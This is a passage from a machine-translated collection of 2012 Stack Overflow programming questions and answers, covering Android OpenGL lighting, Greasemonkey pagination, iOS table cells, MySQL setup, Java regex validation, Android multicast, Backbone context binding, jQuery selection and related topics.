-arch 是达尔文独有的功能。您应该在非达尔文平台上使用 -target。或者，编译 llvm/target 指定目标三元组或创建从 clang 到 -clang 的链接。在您的情况下，目标三元组将是 arm-none-linux-gnueabi

# android - 如何在 Android 上优化每像素照明？

> ID：13221696
> 
> 赞同：0
> 
> 时间：2012-11-04T18:49:58.310
> 
> 标签：android, graphics, opengl-es-2.0

我正在使用 OpenGL ES 2.0 中的 Android 上的每像素照明绘制 3D 场景。当我只渲染几个小物体时，我得到了 60 FPS，但如果我尝试使用风景来放置物体，帧率会大幅下降，大约为 15 帧。我猜这是因为它必须计算景观中所有像素的光照。有什么办法可以优化这个吗？我不想单独在景观上使用每个顶点照明，因为我想在上面投射阴影。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T12:07:42.063

从上面的评论中，我看到您认为着色器的代码不能比现在快，并且您陷入了 GPU 填充率限制。

在这种情况下，您可以通过明智地剔除对象来提高性能：首先绘制最近的对象，这些对象使用快速简单的着色器并遮挡您的景观对象（它使用复杂的着色器进行逐像素照明）。这样 GPU 将只绘制景观的可见部分，在景观着色器中执行较少的繁重计算。在我的情况下，我能够通过重新排序对象以更有效地相互遮挡来获得额外的 3 fps。

但是，如果性能下降真的那么大，您可以发布着色器的代码，也许也有一些方法可以提高着色器的性能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T19:16:45.753

我建议你根据到相机的距离来划分你的风景。对于最近的分区，您可以按像素绘制，还可以添加更多对象和细节。对于远分区使用顶点照明。还对非常远的物体使用冒名顶替者。当你划分你的风景时，你需要在你的模型中考虑到近处风景有多少区域被投射到屏幕空间中，因为如果你靠近地面并且让玩家向下看，你的所有屏幕都需要渲染器像素照明，并且会受到速率下降的影响。

# jquery - 在 URL 中增加值，以便从分页的属性中解析数据

> ID：13221698
> 
> 赞同：1
> 
> 时间：2012-11-04T18:50:01.243
> 
> 标签：jquery, greasemonkey

我正在编写一个 Greasemonkey 脚本，并且想从一个属性中计算一个特定的值。问题是，我想要的属性值是分页的。我尝试更改 URL 以查看它是否可以在一页中列出所有内容，但没有运气。它总是限制在每页只有 40 个视图。

我想知道实现这一点的最佳方法是否是通过使用*if*和*then*语句来增加 URL 中的值。

例如，如果存在某个元素（.standard-row），则 URL 中的*start=0*将增加 40 到*start=40*，然后自动重新加载增加的 URL 并再次扫描，如果特定元素（.standard- row) 再次出现，再增加 40，到*start=80*。一直在存储从每个页面获取的属性值。

当特定元素 (.standard-row) 不再可见时，它将继续计算它收集的属性值。

下面是我要增加的 URL。我想增加的 URL 部分是“ *start=* ”。

```
https://play.google.com/store/account?start=0&num=40 
```

下面列出的代码是我用来计算属性值的代码。它适用于一页，但是，我想从分页页面中获取所有属性值。如果可能的话。

```
var total = 0;
$("#tab-body-account .rap-link").each(function() {
  var price = +($(this).attr("data-docprice").replace(/[^\d\.]/g, ""));
  total += price;  
});
$('.tabbed-panel-tab').before('<div id="SumTotal">*Combined Value: $'+ total.toFixed(2) +'</div>'); 
```

提前感谢您的任何建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T22:20:41.093

使用[`GM_setValue()`](http://wiki.greasespot.net/GM_setValue)和[`GM_getValue()`](http://wiki.greasespot.net/GM_getValue)存储页面之间的总数。检查参数的状态以及元素 `start`是否存在。`.standard-row`

像这样的东西：

```
var startParam      = location.search.match (/\bstart=(\d+)/i);
if (startParam) {
    var totalPrice  = 0;
    var startNum    = parseInt (startParam[1], 10);
    if (startNum    === 0) {
        GM_setValue ("TotalPrice", "0");
    }
    else {
        totalPrice  = parseFloat (GM_getValue ("TotalPrice", 0) );
    }

    $("#tab-body-account .rap-link").each( function () {
        var price   = $(this).attr ("data-docprice").replace (/[^\d\.]/g, "");
        if (price) {
            price   = parseFloat (price);
            if (typeof price === "number") {
                totalPrice += price;
            }
        }
    } );
    //console.log ("totalPrice: ", totalPrice.toFixed(2) );

    $('.tabbed-panel-tab').before (
        '<div id="SumTotal">*Combined Value: $'+ totalPrice.toFixed(2) +'</div>'
    );

    GM_setValue ("TotalPrice", "" + totalPrice);

    if ( $(".standard-row").length ) {
        startNum       += 40;
        var nextPage    = location.href.replace (
            /\bstart=\d+/i, "start=" + startNum
        );
        location.assign (nextPage);
    }
} 
```

* * *

* * *

**注意：**
请务必使用`@grant`GM_ 函数的指令。像这样：

```
// ==UserScript==
// @name     _YOUR SCRIPT NAME
// @include  http://YOUR_SERVER.COM/YOUR_PATH/*
// @require  http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js
// @grant    GM_setValue   
// @grant    GM_getValue   
// ==/UserScript== 
```

# iphone - 通过 segue 发送自定义单元格

> ID：13221703
> 
> 赞同：1
> 
> 时间：2012-11-04T18:50:31.917
> 
> 标签：iphone, ios, ios5, uitableview

我目前有两个 UITableViewController，一个带有自定义单元格的原型，另一个没有。因为它们都是通过从第一个到第二个的 push segue 连接的。我将选定的自定义单元格传递给第二个 tableView。

一切正常，除了当我回到第一个视图时，选择的（并通过的）单元格被隐藏了，但是当我滚动它足以隐藏空白并向后滚动时它会显示。

我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:48:12.013

[Big Nerd Ranch Guide](http://www.bignerdranch.com/book/ios_programming_the_big_nerd_ranch_guide_nd_edition_)基本上说出于这种原因远离故事板。除了关于故事板的其他内容外，它还说：

> “整体故事板使简单的代码更容易，而困难的代码更难”。

不确定您是否应该通过 push segue 传递一个单元格。当不使用情节提要时，您通常会创建一个名为 UITableViewCell 类型的新文件，例如 MyCustomerTableviewCell。然后在你的 UITableView viewDidLoad 方法中，创建一个新的 Nib 并将其添加到 tableView，

```
UINib *nib = [UINib nibWithNibName:@"MyCustomTableViewCell" bundle:nil];
// register this nib that contains the cell
[[self tableView] registerNib:nib forCellReuseIdentifier:@"MyCustomTableViewTableViewCell"]; 
```

然后创建一个新的空 XIB 文件（file->new->User Interface->empty）并将其命名为 MyCustomTableViewCell.xib。将 UITableViewCell 放入界面构建器空间，将其从 UITableViewCell 类型更改为 MyCustomTableViewCell，确保它的 File's Owner 是 MyCustomTableViewCell。

然后在您的 UITableView 文件中，执行此操作...

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
MyCustomTableViewTableViewCell * cell = [tableView dequeueReusableCellWithIdentifier:@"MyCustomTableViewCell"];
...
return cell;
} 
```

无论如何，您都可以将其作为情节提要项目的一部分进行（尽管我没有尝试在一个项目中缺少 XIB 和情节提要）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T19:59:25.253

如果我正确理解你在做什么，你将点击单元格的引用传递给第二个视图控制器，然后你在第二个控制器的表视图中显示它，在 cellForRowAtIndexPath 方法中传递相同的引用。这似乎不是一个好的选择 :-) 首先：因为该单元已分配并排队等待在第一个视图控制器中使用。在任何时候，单元格都可以接收到第一个视图控制器的 prepareForReuse 消息。第二：当您在第二个表格视图中显示单元格时，该单元格将从第一个表格视图中删除。

如果您不想在第二个视图控制器中创建另一个原型单元格，例如，您可以在第一个单元格中分配一个*新*单元格，将所有属性从点击的单元格复制到新单元格，然后将新单元格传递给第二个视图控制器。这是我想到的第一个解决方案，但肯定还有其他更好的解决方案 :-)

# mysql - MySQL configuration type?

> ID：13221704
> 
> 赞同：2
> 
> 时间：2012-11-04T18:50:33.150
> 
> 标签：mysql, dedicated-server, development-machine

I am installing MySQL and when it reaches the configuration step it is asking me to select from on of the following server configuration types:

*   Development Machine
*   Server Machine
*   Dedicated Machine

I am new to mysql, the reason I am installing this is because I am making an application which will store data on a database using MySQL. Now, can someone explain what does these server configurable type mean and which one should I be selecting?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:53:42.467

This is only about setting up the initial `my.cnf` file. You can always change this later.

Generally server configurations allocate a lot more memory to MySQL than you would on your development machine.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:53:58.967

This is basically trying to pick the default memory use setting and configuration (over simplification, but good enough for now). If its on a shared system or you have no idea of the physical machine, start with development.

You can always edit the my.cnf to better optimize your setup

# c# - How to show a gif image in WinRT?

> ID：13221707
> 
> 赞同：1
> 
> 时间：2012-11-04T18:50:41.293
> 
> 标签：c#, image, windows-8, windows-runtime, gif

I am trying to show **NON ANIMATED** gif images in my WinRT app. My current solution is to use a server side converter to convert the images to png, and then load them into an Image control. I have limited bandwidth and would prefer to do it in-app. I used .Net Image Tools to do this on Windows Phone, but it does not appear to be available for Windows RT. I cannot show the images in a WebView because I need to show another element over the image. I know this is a duplicate of [this](https://stackoverflow.com/questions/13213042/how-to-show-a-gif-image-in-windows-rt "this"), but that was closed by users who thought it was a duplicate of a question asking about showing animated gifs. My question is how to show **NON ANIMATED** gifs, and I can't seem to delete the old question.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T18:57:11.257

`<Image>`您可以在元素内的 XAML 中直接使用 gif 。无需转换它。只需将`Source`属性设置为图像。

# android - Problems with loading sounds from Sd-Card

> ID：13221708
> 
> 赞同：1
> 
> 时间：2012-11-04T18:50:48.517
> 
> 标签：android, audio, sd-card

I have an application that should load sound from sd card and then play it by clicking the button. When I click the button i get those messages in LogCat : Unable to create external files directory , SoundPool error loading /sound1.mp3 , sample 0 not READY And this is my code :

```
import java.io.File;

import android.media.AudioManager;
import android.media.SoundPool;
import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.view.Menu;
import android.view.View;

public class MainActivity extends Activity {
SoundPool sp;
int mSoundId;
int mStreamId = 0;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        sp = new SoundPool(5, AudioManager.STREAM_MUSIC, 0);
        String path = getFullFilePath(getApplicationContext(), "sound1.mp3");
        mSoundId = sp.load(path, 1);

    }
    private String getFullFilePath(Context context, String filename) {  
        File directory = context.getExternalFilesDir(null);
        File file = new File(directory, filename);
        if (!file.canRead()) {
            // error handling
        }
        return file.getAbsolutePath();  
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
    public void button1(View view){

        if (mStreamId != 0) {
            sp.stop(mStreamId);
        }
        mStreamId = sp.play(mSoundId, 1, 1, 1, 0, 1f);
    }
} 
```

My LogCat errors :

```
11-04 18:56:34.499: D/dalvikvm(6547): GC_EXTERNAL_ALLOC freed 46K, 51% free 2686K/5379K, external 0K/0K, paused 57ms
11-04 18:56:34.539: W/ApplicationContext(6547): Unable to create external files directory
11-04 18:58:02.129: E/SoundPool(6644): error loading /sound1.mp3 
```

Adding WRITE_EXTERNAL_STORAGE Premission gives this error :

```
11-04 19:58:01.729: E/SoundPool(8022): error loading /mnt/sdcard/Android/data/com.example.idea/files/sound1.mp3 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:26:28.340

出现此错误：

```
11-04 19:58:01.729: E/SoundPool(8022): error loading /mnt/sdcard/Android/data/com.example.idea/files/sound1.mp3 
```

你说：

> 文件存在且位于 /mnt/sdcard/ 文件夹中。应用程序应在外部存储中搜索 sound1.mp3 并加载它（如果存在）。

但是，`/mnt/sdcard/`不是`/mnt/sdcard/Android/data/com.example.idea/files/`简单地将`sound1.mp3`文件移动到应用程序的默认 sdcard 文件夹，SoundPool 就能加载它。

# css - Forcing content to not overflow to the right of the screen

> ID：13221709
> 
> 赞同：0
> 
> 时间：2012-11-04T18:50:49.843
> 
> 标签：css

I'm trying to make all content of all websites in my browser to squeeze to screen width by userstylesheets. I'm stuck at making this work: [https://developers.google.com/speed/pagespeed/psol](https://developers.google.com/speed/pagespeed/psol)

[The content doesn't use my browser's horizontal scrollbar](http://i.imgur.com/f4di6.png) making `width:100%` selector useless. Any other options?

BTW in `width:100%` I'm assuming it's 100% of it's parent's width. How can I get 100% of screen width?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:57:46.743

也许尝试摆脱这个

```
#gc-main {
  overflow: auto;
} 
```

# blackberry - How to draw 2D grid of rectangle in openGL ES in blackberry?

> ID：13221712
> 
> 赞同：1
> 
> 时间：2012-11-04T18:51:49.073
> 
> 标签：blackberry

I want to create a 2D grid of rectangles in blackberry using OpenGL ES. How can I do it?

# java - 我只输入字母而不是数字时遇到问题

> ID：13221716
> 
> 赞同：0
> 
> 时间：2012-11-04T18:52:06.050
> 
> 标签：java, regex

对于我的项目，我需要输入没有数字的名字和姓氏，但我根本无法在网上找到任何东西。如果你能帮忙，那就太好了。

另外，如果您有时间，我需要在用户输入名字和姓氏时用逗号翻转它们。

```
 import java.io.BufferedReader;
    import java.io.InputStreamReader;
    import java.io.IOException;

    public class PhoneListr {

public static void main (String[] args) throws IOException {
    String firstName;
    String lastName;
    System.out.println ("Please enter your first name:");
    firstName = PhoneList ("");
    System.out.println ("Please enter your last name:");
    lastName = PhoneList ("");
    System.out.println ("Your full name is: " + lastName + "," + firstName);
}

public static String PhoneList (String input) throws IOException {
    boolean continueInput = false;

    while (continueInput == false) {

            BufferedReader bufferedReader = new BufferedReader (new InputStreamReader (System.in));
            input = bufferedReader.readLine();
            continueInput = true;

            if(input.matches("[a-zA-Z]+")) {
                continueInput = true;
                    }
                  else {
                 System.out.println ("Error, you may only use the alphabet");
                 continueInput = false;
        }
    }
    return input;
} 
```

}

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T18:55:36.547

使用[String.matches(regex)](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#matches%28java.lang.String%29)：

```
 if(input.matches("[a-zA-Z]+")) {
     System.out.println("your input contains no numerics");
        }
      else {
     System.out.println("only alphabets allowed");
} 
```

上面的正则表达式检查 a 到 z 或 A 到 Z，包括（范围）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T19:03:01.190

对于这种类型的字符串匹配，您需要使用正则表达式或“RegEx”es。这是一个非常大的话题，但[这里有一个介绍](http://www.vogella.com/articles/JavaRegularExpressions/article.html)。正则表达式是用于测试字符串是否符合某些标准的工具，和/或从该字符串中提取某些模式或用其他东西替换与这些模式匹配的某些部分。

这是一个使用 RegEx 测试您的输入是否包含数字的示例：

```
if(input.matches("\\d")) {
 // matched a digit, do something
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T19:18:59.107

基于 OP 问题和澄清，这里有一些建议。

Chaitanya 解决方案完美地处理了*仅字母的检查。*

关于被忽视的问题领域：

我建议你在里面`firstName`做两个变量`lastName``main()`

```
String firstName;
String lastName; 
```

将方法的返回类型更改`phoneList()`为`String`

返回方法中输入的名称（`input`实际上看不到您返回数字的原因）并将其存储在and`number``phoneList``firstName``lastName`

```
System.out.println ("Please enter your first name:");
firstName = PhoneList (0);
System.out.println ("Please input your last name:");
lastNamr =PhoneList (0); 
```

现在以“逗号格式”使用

```
 System.out.println("full name is: " +lastName+ "," +firstName); 
```

当我再次阅读您的程序时，它一团糟！

关于方法`phoneList()`

> 1.  使用正则表达式条件将 continueInput 设置为 true/flase 并且不利用 execptions。

Ps 如果任何其他成员发现上述任何错误，使用手机，不确定格式等，我将不胜感激“编辑”。谢谢。:-) (y)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T19:20:52.947

你也可以使用

```
if(input.matches("[^0-9]"))
{
System.out.println("Don't input numbers!");
continueInput = false;} 
```

不明白第二个问题问什么。为了回答我从你的第二个问题得到的答案是这样的。在主函数中更改这样的代码

```
String first_name = null;
String last_name = null;
System.out.println ("Please enter your first name:");
first_name = PhoneList();
System.out.println ("Please input your last name:");
second_name = PhoneList();
System.out.println (second_name+","+first_name); 
```

然后在 PhoneList 函数中的最后一行应更改为

```
return input; 
```

请检查[链接](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#matches%28java.lang.String%29)！了解更多信息

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-04T19:02:04.017

您可以通过将参数传递给方法 [StringUtils.isNumeric添加检查](http://commons.apache.org/lang/api-2.3/org/apache/commons/lang/StringUtils.html#isNumeric%28java.lang.String%29)

如果输入的字符串是数字，则返回 true

# c# - Detect edges of screen

> ID：13221721
> 
> 赞同：0
> 
> 时间：2012-11-04T18:53:02.083
> 
> 标签：c#, .net, windows-8, windows-store-apps

I am using following code to drag a rectangular in windows 8 app using c#

```
void Drag_ManipulationDelta(object sender,ManipulationDeltaRoutedEventArgs e)
{
   // Move the rectangle.   
   dragTranslation.X += e.Delta.Translation.X;
   dragTranslation.Y += e.Delta.Translation.Y; 
} 
```

But when I throw the rectangle it disappears from screen, I want to keep rectangle within the screen, how to detect the edges of screen?

# java - How to create a JPAQL to pull a tree of parent with multiple children collections and avoid Hibernate Illegal attempt to dereference collection

> ID：13221730
> 
> 赞同：0
> 
> 时间：2012-11-04T18:54:26.267
> 
> 标签：java, hibernate, jpa

I am trying to mimic a eager fetch for a specific situation only.I use `spring-data-jpa` with `hibernate 4.1` as implementation. i have `User`, `Role` and `Right`. `Role` and `User` have many-to-many with additional field thus mapped as an Entity `RoleUser`. `Role` and `Right` also are in `many-to-many` mapped as an Entity `RoleRight`.

I would like to load all right and role for a user into the `Authorization` mechanism of the application when needed. this query below is giving `illegal attempt to dereference collection`

```
 List<Role> roles = (List<Role>)em.createQuery("select r from RoleImpl r JOIN FETCH r.roleRightMap rrm JOIN FETCH rrm.right ur WHERE r.userRoleMap.user.ID=:id ")
            .setParameter("id", ID).getResultList(); 
```

How can it be rewritten to load the role and its mapping thanks.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:21:24.070

对不起，没关系。这是一个疏忽。

查询应该是这样的：

```
select r from RoleImpl r LEFT JOIN FETCH r.roleRightMap rrm LEFT JOIN FETCH r.userRoleMap urm WHERE urm.user.ID=:id 
```

# objective-c - 当 NSWindow with opaque 设置为 NO 时留下空白像素

> ID：13221732
> 
> 赞同：1
> 
> 时间：2012-11-04T18:54:48.733
> 
> 标签：objective-c, macos, cocoa, nswindow

我有一个 NSWindow，我将 opaque 属性设置为`NO`. 问题是，当我将任何视图放在该窗口内时，它的角落都有*空白*像素。

当不透明属性保留`YES`值时，一切正常，但是，窗口的角不再是圆角的。见图片：

![](../Images/afd15a1c3c7d972f90cf0b5fbca27a16.png)

我在 bitbucket 使用简单的示例项目创建了存储库：[https ://bitbucket.org/lukaszb/animationartifacts](https://bitbucket.org/lukaszb/animationartifacts)

有没有办法解决这个问题（保持窗口的角是圆角的并且不出现空白像素）？或者我应该尝试另一种解决方案（没有`setOapque:NO`子`NSWindow`类）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:08:26.147

尝试为您的 启用核心动画层`RoundedView`，即打开`MainMenu.xib`，选择`RoundedView`并在“查看效果”选项卡（最右侧）中检查“核心动画层”下的视图。

或者，您可以以编程方式执行此操作，例如，`RoundedView`添加：

```
- (void)awakeFromNib {
    self.wantsLayer = YES;
    self.layer = [CALayer layer];
    self.layer.backgroundColor = [[NSColor blackColor] CGColor];
    self.layer.cornerRadius = RADIUS;
} 
```

并`#import <QuartzCore/QuartzCore.h>`添加`QuartzCore.framework`到项目中。然后您可以删除该`drawRect`方法，因为`CALayer`已经为您做了圆角。（实际上，如果您只是将此层设置为您在其位置使用`RoundedView`的常规，则可以删除整个班级。）`NSView`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T19:19:36.703

您可以创建一个 NSView 的子类，在它的 drawRect: 方法中使用 NSBezierPath 进行自定义绘图，然后将其设置为窗口的内容视图。

# java - Android 设备未收到多播包

> ID：13221736
> 
> 赞同：9
> 
> 时间：2012-11-04T18:55:24.160
> 
> 标签：java, android, networking

我正在开发一个聊天应用程序，Android 客户端将使用多播（UDP）交换他们的 IP。

每台设备都会在一个单独的线程中将其 ip 发送到多个客户端（运行此应用程序的所有设备）。将有另一个接收者线程来监听这些多播数据包。这是我的代码。

//多播代码。

```
DatagramSocket socket = new DatagramSocket(9898);
            byte buff[] = ip.getBytes();
            DatagramPacket packet = new DatagramPacket(buff, buff.length, InetAddress.getByName("224.0.0.1"),9999);
            socket.send(packet);
            socket.close(); 
```

//接收代码

```
MulticastSocket socket = new MulticastSocket(9999);
        InetAddress group = InetAddress.getByName("224.0.0.1");
        socket.joinGroup(group);

        DatagramPacket packet;

            byte[] buf = new byte[256];
            byte  b = 'x'; //just a separator for time being
            Arrays.fill(buf,b);
            packet = new DatagramPacket(buf, buf.length);
            String received= "";
            while(received!=null)
            {
                socket.receive(packet);
                received = new String(packet.getData());
                received = received.substring(0,received.indexOf('x'));
                this.setIp(received);
                System.out.println("Address: " + received);
            }

        socket.leaveGroup(group);
        socket.close(); 
```

问题是每个设备都打印自己的地址。似乎它从不听其他多播包（我的意思是它也应该打印其他 ip）。我也得到一个下面的日志，不确定这是否相关。

```
11-04 23:56:17.985: I/OSNetworkSystem(603): mcastAddDropMembership interfaceIndex=0 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-04T21:17:23.817

您需要在您的应用程序中获取[MulticastLock](http://developer.android.com/reference/android/net/wifi/WifiManager.MulticastLock.html)，这将允许您的应用程序接收未明确寻址到网络上此设备的数据包。

所需权限：

```
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
<uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/> 
```

示例代码：

```
// Acquire multicast lock
WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);
MulticastLock multicastLock = wifi.createMulticastLock("multicastLock");
multicastLock.setReferenceCounted(true);
multicastLock.acquire();

//Do some mutlicast job here
... ...

// Once your finish using it, release multicast lock
if (multicastLock != null) {
    multicastLock.release();
    multicastLock = null;
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-03-23T15:35:54.117

android 中的 IPv4 多播支持实施得很差。仍然存在纸杯蛋糕时代的错误。

我遇到了一个类似的问题，我正在做一个依赖 mDNS/multicast 进行服务发现的项目。我的 Android 应用程序根本不会订阅多播组。我通过在 Ubuntu 14.04 机器上创建便携式访问点并在其上运行 tcpdump 来验证这一点。连接到它的 Android 设备根本不会发出加入组所需的 IGMP 消息。我可以发送数据包但不能接收它们。

我注意到，每当我加入网络时，我都会收到一条 IPv6 加入组消息到所有系统。这促使我尝试使用 IPv6 多播地址，并且成功了。

较新的 android 设备支持 IPv6，它具有内置和强制多播支持。因此，不要使用 4 类 IPv4 多播地址，而是修改您的代码以使用 IPv6 地址。这将使您的代码至少在本地级别上工作。

[http://developer.android.com/reference/java/net/Inet6Address.html](http://developer.android.com/reference/java/net/Inet6Address.html)

此页面包含大量有关根据您的需要使用哪个 IP 的信息。

有人说它可以在没有 WiFiManager.crrateMulticastLock() 的情况下工作，但我没有尝试过。

理论上，多播到全球网络当然是可能的。但我从未见过一个成功的实际实施。鉴于无处不在的深奥的路由器和防火墙。

这个 SO question 显示了它是如何在桌面上完成的。类似的代码也适用于 android。

[IPv6 组播示例](https://stackoverflow.com/questions/20059106/ipv6-multicast-example)

# grails - Jboss 集群中的 Apache Camel

> ID：13221743
> 
> 赞同：2
> 
> 时间：2012-11-04T18:56:11.193
> 
> 标签：grails, cluster-computing, apache-camel

我是 Apache Camel 的新手，并计划在 Grails 应用程序中实现文件轮询器，以部署在两个节点的 Jboss 集群中。

我打算使用 Grails 路由插件来包含 Camel。

问题是，既然是集群环境，我们会有两个 Camel Contexts 正确吗（每个节点一个）？如果是这样，两者都将具有相同的路线。当源文件夹中存在文件时，两个骆驼上下文都会尝试处理该文件吗？我不希望出现两个节点都尝试处理文件并导致失败的情况。我只希望文件仅由一个骆驼上下文和路线处理。我是否需要做任何特别的事情来处理这种情况，或者骆驼有能力在集群中工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T01:19:08.753

您可以将骆驼上下文作为 jboss 集群单例运行。

**=========================================**

抱歉，正在用手机回复。这里有更多信息。

并不是说您不能在集群中的每个节点上运行骆驼上下文（您可以），而是如果所有节点都在观察同一个文件系统，并且您不希望它们争吵谁来处理目标中放置的文件目录，最好的办法是一次只运行一个上下文实例。

由于您已经在运行 jboss 集群 [ 我假设 ]，因此[HA 单例](http://docs.jboss.org/jbossas/docs/Clustering_Guide/beta422/html/ch05s11.html)模型似乎非常适合您。它将仅在一个实例上运行骆驼上下文，但如果该实例失败，另一个节点将启动上下文，因此您很有可能始终运行上下文。

反正有什么要看的。或者，您可以为集群中的每个节点指定不同的文件掩码，以便每个上下文只会选择与指定文件掩码匹配的文件。

# javascript - 如何从 Backbone/Coffee 中的另一个视图函数访问我的 @map 对象？

> ID：13221746
> 
> 赞同：1
> 
> 时间：2012-11-04T18:56:31.430
> 
> 标签：javascript, backbone.js, coffeescript

我正在尝试使用骨干网、咖啡脚本和谷歌地图 api。我能够渲染地图并添加中心标记。我在地图上添加位置集合作为 morker 时遇到问题。如何与视图中的其他功能或应用程序的其他部分共享下面的@map 对象？

在 addMarker @map 中未定义。

```
render: ->
    $(@el).html(@template())
    primary = @collection.at(@collection.length - 1)
    if primary
      latlng = {}
      @collection.each(@appendLocation)
      latlng['latitude'] = primary.attributes.latitude;
      latlng['longitude'] = primary.attributes.longitude;
      @renderMap(latlng)
   this

  renderMap: (latlng) ->
    view = new Bone.Views.Map()
    $('#map').append(view.render().el)
    latlng = new google.maps.LatLng(latlng['latitude'], latlng['longitude'])
     myOptions =
      zoom: 12
      center: latlng
      mapTypeId: google.maps.MapTypeId.ROADMAP
     @map = new google.maps.Map(view.render().el, myOptions)
    marker = new google.maps.Marker({
      position: latlng,
      animation: google.maps.Animation.DROP,
      map: @map,
      title:"Hello World!"
    })
    @collection.each(@addMarker)

  addMarker: (location)->
    console.log(@map) <-----UNDEFINED
    latlng = new google.maps.LatLng(location.attributes.latitude, location.attributes.longitude)
    console.log location.attributes.latitude
    location_marker = new google.maps.Marker({
      position: latlng,
      animation: google.maps.Animation.DROP,
      map: @map,
      title:"Hello World!"
    }) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T20:01:12.067

我假设您的缩进问题只是一个复制/粘贴错误，并且您的代码看起来像这样：

```
renderMap: (latlng) ->
  view = new Bone.Views.Map()
  $('#map').append(view.render().el)
  latlng = new google.maps.LatLng(latlng['latitude'], latlng['longitude'])
  myOptions =
    zoom: 12
    center: latlng
    mapTypeId: google.maps.MapTypeId.ROADMAP
  @map = new google.maps.Map(view.render().el, myOptions)
  marker = new google.maps.Marker({
    position: latlng,
    animation: google.maps.Animation.DROP,
    map: @map,
    title:"Hello World!"
  })
  @collection.each(@addMarker) 
```

[`each`集合上](http://backbonejs.org/#Collection-Underscore-Methods)的方法只是 Underscore 的一个薄包装，`each`精美的[手册](http://underscorejs.org/#each)有这样的说法`each`：

> **每个** `_.each(list, iterator, [context])`别名：`forEach`
> 
> 迭代一个元素**列表**，依次将每个元素生成一个**迭代器**函数。如果传递了一个，则**迭代器**绑定到**上下文**对象。

使用时没有指定上下文`each`：

```
@collection.each(@addMarker) 
```

所以`@`(AKA `this`) 将在`window`(或者你的环境中的任何全局上下文) inside `addMarker`。你想`@`成为你的观点，所以要么指定上下文：

```
@collection.each(@addMarker, @) 
```

或定义`addMarker`为[绑定函数](http://coffeescript.org/#fat_arrow)：

```
addMarker: (location) =>
  #... 
```

您也可以[`_.bindAll`](http://underscorejs.org/#bindAll)在视图的`initialize`方法中使用，但这在 CoffeeScript 中很少见。

# asp.net - 在 ASP.NET 网站中读取 XML 文件 - 操作效率

> ID：13221753
> 
> 赞同：1
> 
> 时间：2012-11-04T18:57:27.290
> 
> 标签：asp.net, .net, xml, vb.net

项目类型：ASP.NET 网站

目前，我们正在使用一组在项目中存储为 XML 文件的查找数据来填充某个 ASPX 页面上的数据。

我们正在考虑将这种方法更改为以下引用效率的方法：

将 XML 文件值存储在数据库中。在应用程序启动时从数据库中获取值 (Global.asax)。存储在内存对象中，如 LIST 或 HASHTABLE 并进一步使用它。

这是一种有效的方法吗？有什么可以做得更好的吗？

如果您需要更多详细信息，请在下面发表评论。我很乐意分享。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:00:16.603

如果您需要只读访问，您可以在 global.asax 中声明一个静态变量并使用 Application_Start 事件。

# jquery - 使用 Jquery 进行简单选择

> ID：13221756
> 
> 赞同：3
> 
> 时间：2012-11-04T18:57:59.880
> 
> 标签：jquery, css

我只有 3 个背景颜色为蓝色的 div。

我需要 jQuery 来使每个框都可选择。
当单击/选择框时，jQuery 应该将具有不同背景颜色的类 .selected 添加到红色。单击另一个 div 时，所有其他未选择的应变回蓝色。

这是CSS

```
.block {
    width: 300px;
    padding: 10px;
    background: blue;
    color:white;
    margin-top:5px;
}

.selectable {
    background: red;
} 
```

这是html

```
<div class="block">
    Some stuff here
</div>

<div class="block">
    Some stuff here
</div>

<div class="block">
    Some stuff here
</div> 
```

​我如何用 jQuery 做到这一点？
这是所有实际的[jsfiddle](http://jsfiddle.net/3PEqC/2/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T19:03:16.383

试试这个**[jsFiddle 示例](http://jsfiddle.net/j08691/3PEqC/6/)**。

```
$('.block').click(function() {
    $('.block').removeClass('selectable');
    $(this).addClass('selectable');
});​ 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T19:01:42.750

如果元素是兄弟元素，则可以使用[兄弟姐妹方法：](http://api.jquery.com/siblings/)

```
$(".block").on("click", function() {
    $(this).addClass("selectable").siblings().removeClass("selectable");
}); 
```

或者：

```
var $blocks = $(".block").on("click", function() {
    $blocks.removeClass("selectable");
    $(this).addClass("selectable");
